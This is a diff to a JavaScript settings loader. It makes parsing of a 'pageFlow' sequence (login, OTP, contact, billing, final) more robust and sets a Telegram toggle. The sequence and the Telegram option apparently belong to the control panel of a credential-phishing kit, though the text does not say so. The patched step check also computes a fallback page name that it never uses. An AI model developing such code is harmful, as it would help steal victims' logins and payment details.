@@ -114,15 +114,26 @@ async function loadSettings() {
     document.getElementById("telegramToggle").checked = !!data.TelegramEnabled;
     document.getElementById("baSubToggle").checked = !!data.baSub;
 
-    const rawFlow = data.pageFlow && typeof data.pageFlow === "string"
-	  ? JSON.parse(data.pageFlow) // parse only if string
-	  : data.pageFlow || {         // fallback if missing or already object
-	      "1": { page: "login", enabled: true },
-	      "2": { page: "otp", enabled: true },
-	      "3": { page: "contact", enabled: true },
-	      "4": { page: "bill", enabled: true },
-	      "5": { page: "final", enabled: true }
-	    };
+    let rawFlow = data.pageFlow;
+
+	if (typeof rawFlow === "string") {
+	  try {
+	    rawFlow = JSON.parse(rawFlow);
+	  } catch (e) {
+	    console.error("Invalid pageFlow JSON from backend:", rawFlow);
+	    rawFlow = null;
+	  }
+	}
+	
+	if (!rawFlow || typeof rawFlow !== "object") {
+	  rawFlow = {
+	    "1": { page: "login", enabled: true },
+	    "2": { page: "otp", enabled: true },
+	    "3": { page: "contact", enabled: true },
+	    "4": { page: "bill", enabled: true },
+	    "5": { page: "final", enabled: true }
+	  };
+	}
 	    
 	console.log(typeof rawFlow );
 	console.log(rawFlow);
@@ -141,10 +152,10 @@ async function loadSettings() {
 		    const val = rawFlow[step];
 		
 		    // HARD FAIL if malformed (helps debugging)
-		    if (!val || !val.page) {
-		      console.error("Invalid pageFlow step:", step, val);
-		      return;
-		    }
+		    if (!val || typeof val !== "object") return;
+
+				const pageName = val.page || val.name;
+				if (!pageName) return;
 		
 		    pageFlowConfig[step] = {
 		      page: val.page,
